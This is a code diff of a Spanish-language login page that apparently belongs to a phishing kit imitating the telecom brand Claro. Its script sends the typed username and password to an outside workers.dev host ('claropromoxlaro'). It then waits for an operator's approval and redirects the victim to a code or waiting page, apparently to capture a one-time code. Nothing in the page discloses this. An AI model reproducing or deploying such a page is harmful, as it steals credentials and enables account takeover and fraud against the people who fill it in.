@@ -1,58 +1,52 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>Login</title>
+  <meta charset="UTF-8">
+  <title>Login</title>
 </head>
 <body>
-<h2>Formulario de Acceso</h2>
-<form id="loginForm">
-  <label>Usuario:</label>
-  <input type="text" id="usuario" required><br><br>
-  <label>Clave:</label>
-  <input type="password" id="clave" required><br><br>
-  <button type="submit">Enviar</button>
-</form>
+  <h2>Formulario de Acceso</h2>
+  <form id="loginForm">
+    <label>Usuario:</label>
+    <input type="text" id="usuario" required><br><br>
 
-<h2>Ingresando...</h2>
-<p id="status">Esperando autorización...</p>
+    <label>Clave:</label>
+    <input type="password" id="clave" required><br><br>
 
-<script>
-let loginId;
+    <button type="submit">Enviar</button>
+  </form>
 
-document.getElementById("loginForm").addEventListener("submit", async (e) => {
-  e.preventDefault();
-  const usuario = document.getElementById("usuario").value;
-  const clave = document.getElementById("clave").value;
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const usuario = document.getElementById("usuario").value;
+      const clave = document.getElementById("clave").value;
 
-  const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ usuario, clave })
-  });
+      try {
+        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario, clave })
+        });
 
-  const data = await res.json();
-  if (data.ok) {
-    loginId = data.id;
-    document.getElementById("status").textContent = "Esperando autorización...";
-    startPolling();
-  } else {
-    alert("Error: " + data.error);
-  }
-});
+        const data = await res.json();
 
-// Polling para revisar autorización
-function startPolling() {
-  const interval = setInterval(async () => {
-    const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${loginId}`);
-    const statusData = await statusRes.json();
+        if (!data.ok) {
+          alert("❌ Error al enviar: " + data.error);
+          return;
+        }
 
-    if (statusData.autorizado) {
-      clearInterval(interval);
-      window.location.href = "codigo.html";
-    }
-  }, 3000);
-}
-</script>
+        // Guardamos el id temporal para el polling
+        const id = data.id;
+        localStorage.setItem("loginId", id);
+
+        // Redirigimos a la página de espera
+        window.location.href = "esperando.html";
+
+      } catch(err) {
+        alert("❌ Error al conectar al servidor: " + err.message);
+      }
+    });
+  </script>
 </body>
 </html>
